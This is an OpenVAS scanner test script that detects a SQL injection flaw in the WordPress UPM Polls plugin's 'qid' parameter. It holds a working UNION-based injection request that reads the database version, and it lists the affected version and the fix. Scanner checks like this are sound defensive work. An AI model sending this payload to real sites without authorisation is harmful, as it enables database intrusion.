###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_upm_polls_plugin_sql_inj_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# WordPress UPM Polls Plugin 'qid' Parameter SQL Injection Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802032");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress UPM Polls Plugin 'qid' Parameter SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/45535");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17627");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103755");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress UPM Polls Plugin version 1.0.3 and prior.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input passed via
  the 'qid' parameter to '/wp-content/plugins/upm-polls/includes/poll_logs.php'
  allows attacker to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Upgrade to UPM Polls Wordpress plugin version 1.0.4 or later");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"This host is running WordPress UPM Polls Plugin and is prone to
  SQL injection vulnerability.");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/upm-polls/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

useragent = http_get_user_agent();
host = http_host_name( port:port );

path = dir + "/wp-content/plugins/upm-polls/includes/poll_logs.php?qid=" +
       "-1%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x6F70656E7661732D73716" +
       "C2D74657374,0x3a,@@version,0x3a,0x6F70656E7661732D73716C2D74657" +
       "374),NULL,NULL,NULL,NULL--%20";

req = string("GET ", path, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Referer: http://", host, path, "\r\n", "\r\n");
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(res =~ "openvas-sql-test:[0-9]+.*:openvas-sql-test") {
  report = report_vuln_url(port:port, url:path);
  security_message(port:port, data:report);
  exit(0);
}
